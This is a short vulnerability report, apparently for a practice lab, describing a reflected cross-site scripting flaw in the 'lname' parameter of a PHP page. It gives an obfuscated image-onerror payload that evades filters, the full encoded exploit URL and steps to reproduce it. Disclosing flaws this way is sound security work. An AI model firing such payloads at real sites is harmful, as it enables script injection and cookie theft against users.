# Reflected Cross-Site Scripting (XSS) via `lname` Parameter

## Summary

A Reflected Cross-Site Scripting (XSS) vulnerability exists in the `lname` parameter of the application. User-supplied input is reflected into the HTML response without proper sanitization or output encoding, allowing arbitrary JavaScript execution in the victim’s browser.

---

## Vulnerable Endpoint

```text id="rw7z1k"
http://kzlabs.com/punishment/13.php?fname=adad&lname=%3CiMg+src%3Dx+onerror%3D%5Cu0063onfirm%3F.%282%29%3E
```

---

## Vulnerable Parameter

```text id="m3r5qe"
lname
```

---

## Payload Used

```html id="dt0zjv"
<iMg src=x onerror=\u0063onfirm?.(2)>
```

---

## Steps to Reproduce

1. Open the vulnerable URL:

   ```text
   http://kzlabs.com/punishment/13.php?fname=adad&lname=%3CiMg+src%3Dx+onerror%3D%5Cu0063onfirm%3F.%282%29%3E
   ```

2. Observe that the payload is reflected in the response.

3. The JavaScript executes automatically and triggers a popup.

---

## Proof of Concept

```text id="t2w1q9"
http://kzlabs.com/punishment/13.php?fname=adad&lname=%3CiMg+src%3Dx+onerror%3D%5Cu0063onfirm%3F.%282%29%3E
```

### Screenshot

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/a447b2ab-a91f-44b4-a0e9-2ff2fab6c01d" />


---

## Impact

* Session hijacking
* Cookie theft
* JS execution

---

## Recommendations for Fix

* Encode output
* Validate input
* Secure rendering
